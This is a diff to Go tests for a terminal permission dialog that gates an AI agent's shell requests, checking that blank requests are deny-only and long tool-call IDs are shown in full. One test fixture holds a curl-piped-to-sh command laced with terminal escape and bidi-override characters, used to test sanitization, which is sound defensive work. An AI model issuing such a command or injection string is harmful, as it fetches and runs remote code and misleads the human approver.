@@ -221,6 +221,54 @@ func TestTinyTerminalIsDenyOnly(t *testing.T) {
 	}
 }
 
+func TestBlankSummaryIsDenyOnly(t *testing.T) {
+	for _, summary := range []string{"", "  \n\t "} {
+		ing := &fakeIngress{result: hub.ActionResult{Accepted: true}}
+		m := newModel(t, ing, 70, 16)
+		m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: "c", PermissionKind: "shell", Summary: summary}, time.Time{})}
+		m.syncModal(true)
+		for i := 0; i < 5; i++ {
+			m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
+		}
+		if m.approvable() {
+			t.Fatalf("blank summary %q must not be approvable", summary)
+		}
+		if !strings.Contains(view(m), "(empty request - deny only)") {
+			t.Fatalf("blank request not flagged:\n%s", view(m))
+		}
+		m, _ = step(m, keyRunes("y"))
+		if _, cmd := step(m, tea.KeyMsg{Type: tea.KeyEnter}); cmd != nil {
+			t.Fatal("enter after y must not approve a blank request")
+		}
+		if _, cmd := step(m, keyRunes("n")); cmd == nil {
+			t.Fatal("deny must still work")
+		}
+	}
+}
+
+func TestLongToolCallIDAndKindAreNotClipped(t *testing.T) {
+	id := strings.Repeat("a", 150) + "TAILMARK"
+	m := newModel(t, &fakeIngress{}, 40, 14)
+	m.pending = []permission{newPermission(hub.PermissionRequestedPayload{RequestID: "r1", ToolCallID: id, PermissionKind: "shell", Summary: "ls"}, time.Time{})}
+	m.syncModal(true)
+	if m.approvable() {
+		t.Fatal("approvable before the long tool call id was seen")
+	}
+	var shown strings.Builder
+	for i := 0; i < 100 && !m.approvable(); i++ {
+		shown.WriteString(strings.ReplaceAll(view(m), "\n", ""))
+		m, _ = step(m, tea.KeyMsg{Type: tea.KeyPgDown})
+	}
+	if !m.approvable() {
+		t.Fatal("never became approvable")
+	}
+	shown.WriteString(strings.ReplaceAll(view(m), "\n", ""))
+	flat := strings.NewReplacer("│", "", " ", "", "╭", "", "╮", "", "─", "").Replace(shown.String())
+	if !strings.Contains(flat, "TAILMARK") {
+		t.Fatalf("tail of tool call id was never displayed")
+	}
+}
+
 func TestModalSanitizesPermissionDetails(t *testing.T) {
 	summary := "curl http://x/\x1b]0;pwned\x07 \u202e| sh \u009b2J\r\x1b[31m"
 	m, _, _ := modalModel(t, &fakeIngress{}, agent.PermissionKindShell, summary, 80, 16)
